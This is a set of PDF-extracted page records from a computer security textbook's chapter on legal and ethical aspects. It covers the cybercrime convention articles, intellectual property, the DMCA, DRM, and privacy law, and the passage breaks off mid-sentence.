       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 604, 'page_label': '603'}, page_content='19.1 / CYBERCRIME AND COMPUTER CRIME  603\\nArticle 2 Illegal access\\nThe access to the whole or any part of a computer system without right.\\nArticle 3 Illegal interception\\nThe interception without right, made by technical means, of non public transmissions of computer data to, \\nfrom, or within a computer system, including electromagnetic emissions from a computer system carrying such \\ncomputer data.\\nArticle 4 Data interference\\nThe damaging, deletion, deterioration, alteration, or suppression of computer data without right.\\nArticle 5 System interference\\nThe serious hindering without right of the functioning of a computer system by inputting, transmitting, \\n damaging, deleting, deteriorating, altering, or suppressing computer data.\\nArticle 6 Misuse of devices\\na. The production, sale, procurement for use, import, distribution, or otherwise making available of:\\ni. A device, including a computer program, designed or adapted primarily for the purpose of commit-\\nting any of the offences established in accordance with the above Articles 2 through 5;\\nii. A computer password, access code, or similar data by which the whole or any part of a computer \\n system is capable of being accessed, with intent that it be used for the purpose of committing any of \\nthe offences established in the above Articles 2 through 5; and\\nb. The possession of an item referred to in paragraphs a.i or ii above, with intent that it be used for the \\npurpose of committing any of the offences established in the above Articles 2 through 5. A Party may \\nrequire by law that a number of such items be possessed before criminal liability attaches.\\nArticle 7 Computer-related forgery\\nThe input, alteration, deletion, or suppression of computer data, resulting in inauthentic data with the intent \\nthat it be considered or acted upon for legal purposes as if it were authentic, regardless whether or not the data \\nis directly readable and intelligible.\\nArticle 8 Computer-related fraud\\nThe causing of a loss of property to another person by:\\na. Any input, alteration, deletion, or suppression of  computer data;\\nb. Any interference with the functioning of a computer system, with fraudulent or dishonest intent of \\n procuring, without right, an economic benefit for oneself or for another person.\\nArticle 9 Offenses related to child pornography\\na. Producing child pornography for the purpose of its distribution through a computer system;\\nb. Offering or making available child pornography through a computer system;\\nc. Distributing or transmitting child pornography through a computer system;\\nd. Procuring child pornography through a computer system for oneself or for another person; and\\ne. Possessing child pornography in a computer system or on a computer-data storage medium.\\nArticle 10 Infringements of copyright and related rights\\nArticle 11 Attempt and aiding or abetting\\nAiding or abetting the commission of any of the offences established in accordance with the above Articles 2 \\nthrough 10 of the present Convention with intent that such offence be committed. An attempt to commit any \\nof the offences established in accordance with Articles 3 through 5, 7 , 8, and 9.1.a and c. of this Convention.\\nTable 19.1 Cybercrimes Cited in the Convention on Cybercrime\\nThe relative lack of success in bringing cybercriminals to justice has led to an \\nincrease in their numbers, boldness, and the global scale of their operations. It is \\ndifficult to profile cybercriminals in the way that is often done with other types of \\nrepeat offenders. The cybercriminal tends to be young and very computer-savvy, but \\nM19_STAL0611_04_GE_C19.indd   603 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 605, 'page_label': '604'}, page_content='604  CHAPTER 19 / LEgAL AND ETHICAL AsPECTs\\nCommitted \\n(net %)\\nInsider \\n(%)\\nOutsider \\n(%)\\nSource \\nUnknown \\n(%)\\nVirus, worms or other malicious code 74 18 46 26\\nUnauthorized access to/use of information, \\n systems, or networks\\n55 25 30 10\\nIllegal generation of spam e-mail 53  6 38 17\\nSpyware (not including adware) 52 13 33 18\\nDenial-of-service attacks 49  9 32 14\\nFraud (credit card fraud, etc.) 46 19 28  5\\nPhishing (someone posing as your company online \\nin an attempt to gain personal data from your \\n subscribers or employees)\\n46  5 35 12\\nTheft of other (proprietary) info including \\n customer records, financial records, etc.\\n40 23 16  6\\nTheft of intellectual property 35 24 12  6\\nIntentional exposure of private or sensitive \\ninformation\\n35 17 12  9\\nIdentity theft of customer 33 13 19  6\\nSabotage: deliberate disruption, deletion, or \\ndestruction of information, systems, or networks\\n30 14 14  6\\nZombie machines on organization’s network/bots/\\nuse of network by BotNets\\n30  6 19 10\\nWeb site defacement 24  4 14  7\\nExtortion 16  5  9  4\\nOther 17  6  8  7\\nTable 19.2 CERT 2007 E-Crime Watch Survey Results\\nthe range of behavioral characteristics is wide. Further, there exist no cybercriminal \\ndatabases that can point investigators to likely suspects.\\nThe success of cybercriminals, and the relative lack of success of law enforce -\\nment, influence the behavior of cybercrime victims. As with law enforcement, many \\norganizations that may be the target of attack have not invested sufficiently in \\n technical, physical, and human-factor resources to prevent attacks. Reporting rates \\ntend to be low because of a lack of confidence in law enforcement, a concern about \\ncorporate reputation, and a concern about civil liability. The low reporting rates and \\nthe reluctance to work with law enforcement on the part of victims feeds into the \\nhandicaps under which law enforcement works, completing the vicious cycle.\\nWorking with Law Enforcement\\nExecutive management and security administrators need to look upon law enforce-\\nment as another resource and tool, alongside technical, physical, and human-factor \\nresources. The successful use of law enforcement depends much more on people skills \\nM19_STAL0611_04_GE_C19.indd   604 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 606, 'page_label': '605'}, page_content='19.2 / INTELLECTUAL PROPERTY  605\\nthan technical skills. Management needs to understand the criminal  investigation \\nprocess, the inputs that investigators need, and the ways in which the victim can con-\\ntribute positively to the investigation.\\n 19.2 INTELLECTUAL PROPERTY\\nThe U.S. legal system, and legal systems generally, distinguish three primary types \\nof property:\\n• Real property: Land and things permanently attached to the land, such as trees, \\nbuildings, and stationary mobile homes.\\n• Personal property: Personal effects, moveable property and goods, such as cars, \\nbank accounts, wages, securities, a small business, furniture, insurance policies, \\njewelry, patents, pets, and season baseball tickets.\\n• Intellectual property: Any intangible asset that consists of human knowledge \\nand ideas. Examples include software, data, novels, sound recordings, the design \\nof a new type of mousetrap, or a cure for a disease.\\nThis section focuses on the computer security aspects of intellectual property (IP).\\nTypes of Intellectual Property\\nThere are three main types of intellectual property for which legal protection is \\navailable: copyrights, trademarks, and patents. The legal protection is against \\n infringement, which is the invasion of the rights secured by copyrights, trademarks, \\nand patents. The right to seek civil recourse against anyone infringing his or her \\nproperty is granted to the IP owner. Depending upon the type of IP , infringement \\nmay vary (see Figure 19.1).\\nFigure 19.1 Intellectual Property Infringement\\nUnauthorized use\\nCopyrights\\nUnauthorized\\nmaking,\\nusing, or selling\\nPatents\\nUnauthorized use or\\ncolorable imitation\\nTrademarks\\nM19_STAL0611_04_GE_C19.indd   605 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 607, 'page_label': '606'}, page_content='606  CHAPTER 19 / LEgAL AND ETHICAL AsPECTs\\nCopyrights Copyright law protects the tangible or fixed expression of an idea, not \\nthe idea itself. A creator can claim copyright, and file for the copyright at a national \\ngovernment copyright office, if the following conditions are fulfilled:4\\n• The proposed work is original.\\n• The creator has put this original idea into a concrete form, such as hard copy \\n(paper), software, or multimedia form.\\nExamples of items that may be copyrighted include the following [BRAU01]:\\n• Literary works: Novels, nonfiction prose, poetry, newspaper articles and news-\\npapers, magazine articles and magazines, catalogs, brochures, ads (text), and \\ncompilations such as business directories\\n• Musical works: Songs, advertising jingles, and instrumentals\\n• Dramatic works: Plays, operas, and skits\\n• Pantomimes and choreographic works: Ballets, modern dance, jazz dance, and \\nmime works\\n• Pictorial, graphic, and sculptural works: Photographs, posters, maps, paintings, \\ndrawings, graphic art, display ads, cartoon strips and cartoon characters, stuffed \\nanimals, statues, paintings, and works of fine art\\n• Motion pictures and other audio visual works: Movies, documentaries, travel-\\nogues, training films and videos, television shows, television ads, and interactive \\nmultimedia works\\n• Sound recordings: Recordings of music, sound, or words\\n• Architectural works : Building designs, whether in the form of architectural \\nplans, drawings, or the constructed building itself\\n• Software-r elated works : Computer software, software documentation and \\n manuals, training manuals, and other manuals\\nThe copyright owner has the following exclusive rights, protected against \\ninfringement:\\n• Reproduction right: Lets the owner make copies of a work\\n• Modification right: Also known as the derivative-works right; concerns modify-\\ning a work to create a new or derivative work\\n• Distribution right : Lets the owner publicly sell, rent, lease, or lend copies of \\nthe work\\n• Public-performance right: Applies mainly to live performances\\n• Public-display right: Lets the owner publicly show a copy of the work directly \\nor by means of a film, slide, or television image\\n4Copyright is automatically assigned to newly created works in countries that subscribe to the Berne \\nconvention, which encompasses the vast majority of nations. Some countries, such as the United States, \\nprovide additional legal protection if the work is registered.\\nM19_STAL0611_04_GE_C19.indd   606 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 608, 'page_label': '607'}, page_content='19.2 / INTELLECTUAL PROPERTY  607\\npatents A patent for an invention is the grant of a property right to the inventor. \\nThe right conferred by the patent grant is, in the language of the U.S. statute and \\nof the grant itself, “the right to exclude others from making, using, offering for sale, \\nor selling” the invention in the United States or “importing” the invention into the \\nUnited States. Similar wording appears in the statutes of other nations. There are \\nthree types of patents:\\n• Utility patents: May be granted to anyone who invents or discovers any new \\nand useful process, machine, article of manufacture, or composition of matter, \\nor any new and useful improvement thereof;\\n• Design patents : May be granted to anyone who invents a new, original, and \\nornamental design for an article of manufacture; and\\n• Plant patents: May be granted to anyone who invents or discovers and asexually \\nreproduces any distinct and new variety of plant.\\nAn example of a patent from the computer security realm is the RSA public-key \\ncryptosystem. From the time it was granted in 1983 until the patent expired in 2000, \\nthe patent holder, RSA Security, was entitled to receive a fee for each  implementation \\nof RSA.\\ntrademarks A trademark is a word, name, symbol, or device that is used in trade \\nwith goods to indicate the source of the goods and to distinguish them from the goods \\nof others. A servicemark is the same as a trademark except that it identifies and \\ndistinguishes the source of a service rather than a product. The terms trademark and \\nmark are commonly used to refer to both trademarks and servicemarks. Trademark \\nrights may be used to prevent others from using a confusingly similar mark, but not \\nto prevent others from making the same goods or from selling the same goods or \\nservices under a clearly different mark.\\nIntellectual Property Relevant to Network  \\nand Computer Security\\nA number of forms of intellectual property are relevant in the context of network \\nand computer security. Here we mention some of the most prominent:\\n• Software: This includes programs produced by vendors of commercial software \\n(e.g., operating systems, utility programs, and applications) as well as share -\\nware, proprietary software created by an organization for internal use, and \\nsoftware produced by individuals. For all such software, copyright protection is \\navailable if desired. In some cases, a patent protection may also be appropriate.\\n• Databases: A database may consist of data that is collected and organized \\nin such a fashion that it has potential commercial value. An example is an \\n economic forecasting database. Such databases may be protected by copyright.\\n• Digital content : This category includes audio files, video files, multimedia, \\ncourseware, Website content, and any other original digital work that can be \\npresented in some fashion using computers or other digital devices.\\n• Algorithms: An example of a patentable algorithm, previously cited, is the RSA \\npublic-key cryptosystem.\\nM19_STAL0611_04_GE_C19.indd   607 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 609, 'page_label': '608'}, page_content='608  CHAPTER 19 / LEgAL AND ETHICAL AsPECTs\\nThe computer security techniques discussed in this book provide some protec-\\ntion in some of the categories mentioned above. For example, a statistical database is \\nintended for use in such a way as to produce statistical results, without the user having \\naccess to the raw data. Various techniques for protecting the raw data are discussed in \\nChapter 5. On the other hand, if a user is given access to software, such as an operat-\\ning system or an application, it is possible for the user to make copies of the object \\nimage and distribute the copies or use them on machines for which a license has not \\nbeen obtained. In such cases, legal sanctions rather than technical computer security \\nmeasures are the appropriate tool for protection.\\nDigital Millennium Copyright Act\\nThe U.S. Digital Millennium Copyright Act (DMCA) has had a profound effect on \\nthe protection of digital content rights in both the United States and worldwide. The \\nDMCA, signed into law in 1998, is designed to implement World Intellectual Property \\nOrganization (WIPO) treaties, signed in 1996. In essence, DMCA strengthens the \\nprotection of copyrighted materials in digital format.\\nThe DMCA encourages copyright owners to use technological measures to \\nprotect copyrighted works. These measures fall into two categories: measures that \\nprevent access to the work, and measures that prevent copying of the work. Fur -\\nther, the law prohibits attempts to bypass such measures. Specifically, the law states \\nthat “no person shall circumvent a technological measure that effectively controls \\naccess to a work protected under this title.” Among other effects of this clause, it \\nprohibits almost all unauthorized decryption of content. The law further prohibits the \\nmanufacture, release, or sale of products, services, and devices that can crack encryp-\\ntion designed to thwart either access to or copying of material unauthorized by the \\ncopyright holder. Both criminal and civil penalties apply to attempts to circumvent \\n technological measures and to assist in such circumvention.\\nCertain actions are exempted from the provisions of the DMCA and other \\ncopyright laws, including the following:\\n• Fair use: This concept is not tightly defined. It is intended to permit others to \\nperform, show, quote, copy, and otherwise distribute portions of the work for \\ncertain purposes. These purposes include review, comment, and discussion of \\ncopyrighted works.\\n• Reverse engineering: Reverse engineering of a software product is allowed if \\nthe user has the right to use a copy of the program and if the purpose of the \\nreverse engineering is not to duplicate the functionality of the program but \\nrather to achieve interoperability.\\n• Encryption research: “Good faith” encryption research is allowed. In essence, \\nthis exemption allows decryption attempts to advance the development of \\nencryption technology.\\n• Security testing: This is the access of a computer or network for the good faith \\ntesting, investigating, or correcting a security flaw or vulnerability, with the \\nauthorization of the owner or operator.\\n• Personal privacy: It is generally permitted to bypass technological measures if \\nthat is the only reasonable way to prevent the access to result in the revealing \\nor recording of personally identifying information.\\nM19_STAL0611_04_GE_C19.indd   608 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 610, 'page_label': '609'}, page_content='19.2 / INTELLECTUAL PROPERTY  609\\nDespite the exemptions built into the Act, there is considerable concern, \\n especially in the resear ch and academic communities, that the act inhibits legiti -\\nmate security and encryption research. These parties feel that DMCA stifles inno -\\nvation and academic freedom and is a threat to open-source software development \\n[ACM04].\\nDigital Rights Management\\nDigital Rights Management (DRM) refers to systems and procedures that ensure \\nthat holders of digital rights are clearly identified and receive the stipulated pay -\\nment for their works. The systems and procedures may also impose further restric -\\ntions on the use of digital objects, such as inhibiting printing or prohibiting further \\ndistribution.\\nThere is no single DRM standard or architecture. DRM encompasses a variety \\nof approaches to intellectual property management and enforcement by providing \\nsecure and trusted automated services to control the distribution and use of content. \\nIn general, the objective is to provide mechanisms for the complete content manage-\\nment life cycle (creation, subsequent contribution by others, access, distribution, and \\nuse), including the management of rights information associated with the content.\\nDRM systems should meet the following objectives:\\n1. Provide persistent content protection against unauthorized access to the digital \\ncontent, limiting access to only those with the proper authorization.\\n2. Support a variety of digital content types (e.g., music files, video streams, digital \\nbooks, and images).\\n3. Support content use on a variety of platforms (e.g., PCs, tablets, iPods, and mobile \\nphones).\\n4. Support content distribution on a variety of media, including CD-ROMs, DVDs, \\nand portable USB storage devices.\\nFigure 19.2, based on [LIU03], illustrates a typical DRM model in terms of the \\nprincipal users of DRM systems:\\n• Content provider: Holds the digital rights of the content and wants to protect \\nthese rights. Examples are a music record label and a movie studio.\\n• Distributor: Provides distribution channels, such as an online shop or a Web \\nretailer. For example, an online distributor receives the digital content from the \\ncontent provider and creates a Web catalog presenting the content and rights \\nmetadata for the content promotion.\\n• Consumer: Uses the system to access the digital content by retrieving down -\\nloadable or streaming content through the distribution channel and then pay -\\ning for the digital license. The player/viewer application used by the consumer \\ntakes charge of initiating license request to the clearinghouse and enforcing the \\ncontent usage rights.\\n• Clearinghouse: Handles the financial transaction for issuing the digital license \\nto the consumer and pays royalty fees to the content provider and distribution \\nfees to the distributor accordingly. The clearinghouse is also responsible for \\nlogging license consumptions for every consumer.\\nM19_STAL0611_04_GE_C19.indd   609 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 611, 'page_label': '610'}, page_content='610  CHAPTER 19 / LEgAL AND ETHICAL AsPECTs\\nIn this model, the distributor need not enforce the access rights. Instead, the \\ncontent provider protects the content in such a way (typically encryption) that the \\nconsumer must purchase a digital license and access capability from the clearing -\\nhouse. The clearinghouse consults usage rules provided by the content provider \\nto determine what access is permitted and the fee for a particular type of access. \\n Having collected the fee, the clearinghouse credits the content provider and distribu-\\ntor appropriately.\\nFigure 19.3 shows a generic system architecture to support DRM  functionality. \\nThe system is accessed by parties in three roles. Rights holders  are the content \\n providers, who either created the content or have acquired rights to the content. \\nService providers include distributors and clearinghouses. Consumers are those who \\npurchase the right to access to content for specific uses. There is system interface to \\nthe services provided by the DRM system:\\n• Identity management: Mechanisms to uniquely identify entities, such as parties \\nand content.\\n• Content management: Processes and functions needed to manage the content \\nlifestyle.\\n• Rights management: Processes and functions needed to manage rights, rights \\nholders, and associated requirements.\\nBelow these management modules are a set of common functions. The  security/\\nencryption module provides functions to encrypt content and to sign license \\nFigure 19.2 DRM Components\\nInformation ﬂow\\nMoney ﬂow\\nContent\\nprovider Distributor\\nClearinghouse Consumer\\nProtected\\ncontent\\nProtected\\ncontent\\nDigital\\nlicense\\nUsage\\nrules\\nPaying\\nroyalty fees Paying\\ndistribution\\nRequiring license\\nand paying\\nM19_STAL0611_04_GE_C19.indd   610 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 612, 'page_label': '611'}, page_content='19.3 / PRIVACY  611\\nFigure 19.3 DRM System Architecture\\nROLESSERVICESFUNCTIONS\\nagreements. The identity management service makes use of the authentication  \\nand authorization functions to identify all parties in the relationship. Using these \\n functions, the identity management service includes the following:\\n• Allocation of unique party identifiers\\n• User profile and preferences\\n• User’s device management\\n• Public-key management\\nBilling/payments functions deal with the collection of usage fees from  consumers \\nand the distribution of payments to rights holders and distributors. Delivery functions \\ndeal with the delivery of content to consumers.\\n 19.3 PRIVACY\\nAn issue with considerable overlap with computer security is that of privacy. On one \\nhand, the scale and interconnectedness of personal information collected and stored \\nin information systems has increased dramatically, motivated by law enforcement, \\nnational security, and economic incentives. The last mentioned has been perhaps \\nthe main driving force. In a global information economy, it is likely that the most \\neconomically valuable electronic asset is aggregations of information on individuals \\n[JUDY14]. On the other hand, individuals have become increasingly aware of the \\nextent to which government agencies, businesses, and even Internet users have access \\nto their personal information and private details about their lives and activities.\\nConcerns about the extent to which personal privacy has been and may be \\ncompromised have led to a variety of legal and technical approaches to reinforcing \\nprivacy rights.\\nM19_STAL0611_04_GE_C19.indd   611 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 613, 'page_label': '612'}, page_content='612  CHAPTER 19 / LEgAL AND ETHICAL AsPECTs\\nPrivacy Law and Regulation\\nA number of international organizations and national governments have introduced \\nlaws and regulations intended to protect individual privacy. We look at two regional \\nexamples in this subsection.\\neuropean union data proteCtion direCtive In 1998, the EU adopted the \\nDirective on Data Protection to both (1) ensure that member states protected fun -\\ndamental privacy rights when processing personal information and (2) prevent \\n member states from restricting the free flow of personal information within the EU. \\nThe  Directive is not itself a law, but requires member states to enact laws encompass-\\ning its terms. The Directive is organized around the following principles of personal \\ninformation use:\\n• Notice: Organizations must notify individuals what personal information they \\nare collecting, the uses of that information, and what choices the individual \\nmay have.\\n• Consent: Individuals must be able to choose whether and how their personal \\ninformation is used by, or disclosed to, third parties. They have the right not to \\nhave any sensitive information collected or used without express permission, \\nincluding race, religion, health, union membership, beliefs, and sex life.\\n• Consistency: Organizations may use personal information only in accordance \\nwith the terms of the notice given the data subject and any choices with respect \\nto its use exercised by the subject.\\n• Access: Individuals must have the right and ability to access their information \\nand correct, modify, or delete any portion of it.\\n• Security : Organizations must provide adequate security, using technical \\nand other means, to protect the integrity and confidentiality of personal \\ninformation.\\n• Onward transfer: Third parties receiving personal information must provide the \\nsame level of privacy protection as the organization from whom the informa -\\ntion is obtained.\\n• Enforcement: The Directive grants a private right of action to data subjects \\nwhen organizations do not follow the law. In addition, each EU member has \\na regulatory enforcement agency concerned with privacy rights enforcement.\\nMore recently, the EU adopted further directives relevant to data  privacy. \\nOne is the 2002 Directive on Privacy and Electronic Communications that imposes \\nan obligation on member states to safeguard the confidentiality of  communications \\nand r elated traffic data. Another is the 2006 Data Retention Directive that \\nimposes an obligation on member states to ensure that communications service \\nproviders retain specified categories of communications data for a period of \\n6–24 months, and to make this data available to competent national authorities \\nin accordance with national law. However, this latter directive was declared invalid \\nby the Court of Justice of the European Union as being unjustified interference \\nwith the privacy rights enshrined in the EU Charter [RYAN16]. This illustrates the \\nM19_STAL0611_04_GE_C19.indd   612 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 614, 'page_label': '613'}, page_content='19.3 / PRIVACY  613\\ndifficult task legislators face balancing data surveillance with appropriate levels of  \\nprivacy.\\nunited states privaCy initiatives The first comprehensive privacy legislation \\nadopted in the United States was the Privacy Act of 1974, which dealt with personal \\ninformation collected and used by federal agencies. The Act is intended to:\\n1. Permit individuals to determine what records pertaining to them are collected, \\nmaintained, used, or disseminated.\\n2. Permit individuals to forbid r ecords obtained for one purpose to be used for \\nanother purpose without consent.\\n3. Permit individuals to obtain access to records pertaining to them and to correct \\nand amend such records as appropriate.\\n4. Ensure that agencies collect, maintain, and use personal information in a manner \\nthat ensures that the information is current, adequate, relevant, and not excessive \\nfor its intended use.\\n5. Create a private right of action for individuals whose personal information is \\nnot used in accordance with the Act.\\nAs with all privacy laws and regulations, there are exceptions and conditions \\nattached to this Act, such as criminal investigations, national security concerns, and \\nconflicts between competing individual rights of privacy.\\nWhile the 1974 Privacy Act covers government records, a number of other U.S. \\nlaws have been enacted that cover other areas, including the following:\\n• Banking and financial records : Personal banking information is protected \\nin certain ways by a number of laws, including the recent Financial Services \\n Modernization Act.\\n• Credit reports: The Fair Credit Reporting Act confers certain rights on individu-\\nals, and obligations on credit reporting agencies.\\n• Medical and health insurance records: A variety of laws have been in place for \\ndecades dealing with medical records privacy. The Health Insurance Portability \\nand Accountability Act (HIPPA) created significant new rights for patients to \\nprotect and access their own health information.\\n• Children’s privacy: The Children’s Online Privacy Protection Act places restric-\\ntions on online organizations in the collection of data from children under the \\nage of 13.\\n• Electronic communications: The Electronic Communications Privacy Act gen-\\nerally prohibits unauthorized and intentional interception of wire and electronic \\ncommunications during the transmission phase and unauthorized accessing of \\nelectronically stored wire and electronic communications.\\nOrganizational Response\\nOrganizations need to deploy both management controls and technical  measures \\nto comply with laws and regulations concerning privacy, as well as to implement \\nM19_STAL0611_04_GE_C19.indd   613 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 615, 'page_label': '614'}, page_content='614  CHAPTER 19 / LEgAL AND ETHICAL AsPECTs\\ncorporate policies concerning employee privacy. Key aspects of this response \\ninclude creating a privacy policy document as a companion to a security  policy \\ndocument, creating a strategic privacy plan document as a companion to a  strategic \\nsecurity plan document, and creating a privacy awareness program for  employees \\nas a companion to a security awareness program. As part of the  security polic y, \\nthe organization should have a Chief Privacy Officer or equivalent, and a manage -\\nment plan for the selection, implementation, and monitoring of privacy controls. \\nA useful and comprehensive set of such controls is provided in NIST SP 800-53 \\n(Security and Privacy Controls for Federal Information Systems and Organiza -\\ntions , January 2015). The set is organized into eight families and a total of 24 \\ncontrols.\\nTwo ISO documents are relevant: ISO 27001 ( Information security manage -\\nment systems—Requirements , 2013) briefly states that privacy and protection of \\npersonally identifiable information must be ensured to comply with  regulations  \\nand meet contractual obligations; ISO 27002 ( Code of Practice for Information \\nSecurity Management , 2013) provides general implementation guidance that \\nemphasizes the need for management involvement.\\nComputer Usage Privacy\\nThe Common Criteria specification [CCPS12b] includes a definition of a set of func-\\ntional requirements in a Privacy Class, which should be implemented in a trusted \\nsystem. The purpose of the privacy functions is to provide a user protection against \\ndiscovery and misuse of identity by other users. This specification is a useful guide \\nto how to design privacy support functions as part of a computer system. Figure 19.4 \\nshows a breakdown of privacy into four major areas, each of which has one or more \\nspecific functions:\\n• Anonymity: Ensures that a user may use a resource or service without disclos-\\ning the user’s identity. Specifically, this means that other users or subjects are \\nunable to determine the identity of a user bound to a subject (e.g., process or \\nuser group) or operation. It further means that the system will not solicit the \\nreal name of a user. Anonymity need not conflict with authorization and access \\ncontrol functions, which are bound to computer-based user IDs, not to personal \\nuser information.\\n• Pseudonymity: Ensures that a user may use a resource or service without dis -\\nclosing its user identity, but can still be accountable for that use. The system \\nshall provide an alias to prevent other users from determining a user’s identity, \\nbut the system shall be able to determine the user’s identity from an assigned \\nalias.\\n• Unlinkability : Ensures that a user may make multiple uses of resources or \\n services without others being able to link these uses together.\\n• Unobservability: Ensures that a user may use a resource or service without \\n others, especially third parties, being able to observe that the resource or service \\nis being used. Unobservability requires users and/or subjects cannot determine \\nwhether an operation is being performed. Allocation of information impacting \\nM19_STAL0611_04_GE_C19.indd   614 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 616, 'page_label': '615'}, page_content='19.3 / PRIVACY  615\\nunobservability requires the security function provide specific mechanisms to \\navoid the concentration of privacy related information within the system. Unob-\\nservability without soliciting information requires the security function does not \\ntry to obtain privacy-related information that might be used to compromise \\nunobservability. Authorized user observability requires the security function to \\nprovide one or more authorized users with a capability to observe the usage of \\nresources and/or services.\\nNote the Common Criteria specification is primarily concerned with the privacy of \\nan individual with respect to that individual’s use of computer resources, rather than \\nthe privacy of personal information concerning that individual.\\nPrivacy, Data Surveillance, Big Data, and Social Media\\nThe demands of big business, government and law enforcement have created \\nnew threats to personal privacy [POLO13]. Scientific research, including medical \\nresearch, can use analysis of large collections of 